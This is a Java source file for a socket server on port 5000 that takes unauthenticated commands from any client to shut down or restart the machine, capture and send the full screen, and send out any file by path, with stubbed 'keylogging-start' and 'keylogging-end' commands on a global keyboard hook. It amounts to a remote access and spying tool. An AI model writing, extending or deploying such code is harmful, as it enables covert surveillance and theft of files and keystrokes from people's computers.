import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Scanner;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Server {
    public static void main(String[] args) {
        try {
            try {
                GlobalScreen.registerNativeHook();
            }
            catch (NativeHookException ex) {
                System.err.println("There was a problem registering the native hook.");
                System.err.println(ex.getMessage());

                System.exit(1);
            }

            ServerSocket serverSocket = new ServerSocket(5000);
            while (true) {
                Socket socket = serverSocket.accept();
                System.out.println("Client connected: " + socket.getInetAddress().getHostAddress());

                Thread thread = new Thread(
                        () -> handleClientRequest(socket)
                );
                thread.start();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void handleClientRequest(Socket socket) {
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter writer = new PrintWriter(socket.getOutputStream());

            while (true) {
                String request = reader.readLine();

                if (request.equals("shutdown")) {
                    Runtime.getRuntime().exec("shutdown -s -t 900");
                    writer.println("The computer is shutting down.");
                    writer.flush();

                } else if (request.equals("restart")) {
                    Runtime.getRuntime().exec("shutdown -r -t 900");
                    writer.println("The computer is restarting.");
                    writer.flush();

                } else if (request.equals("cancel")) {
                    Runtime.getRuntime().exec("shutdown -a");
                    writer.println("All shutdown commands have been cancelled.");
                    writer.flush();

                } else if (request.equals("screenshot")) {
                    BufferedImage screenshot = new Robot().createScreenCapture(
                            new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())
                    );

                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    ImageIO.write(screenshot, "png", baos);
                    byte[] imageBytes = baos.toByteArray();
                    baos.close();

                    writer.println(imageBytes.length);
                    writer.flush();
                    socket.getOutputStream().write(imageBytes);

                } else if (request.startsWith("collect-")) {
                    String filePath = request.substring(8);
                    File file = new File(filePath);

                    if (file.exists()) {
                        writer.println(file.length());
                        writer.flush();

                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        byte[] buffer = new byte[8192];
                        InputStream in = new FileInputStream(file);
                        int count;

                        while ((count = in.read(buffer)) > 0) {
                            baos.write(buffer, 0, count);
                        }
                        in.close();
                        socket.getOutputStream().write(baos.toByteArray());
                    } else {
                        writer.println("The file doesn't exist.");
                        writer.flush();
                    }

                }else if (request.equals("keylogging-start")) {
                    //GlobalScreen.addNativeKeyListener(new Server());

                }else if (request.equals("keylogging-end")) {

                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
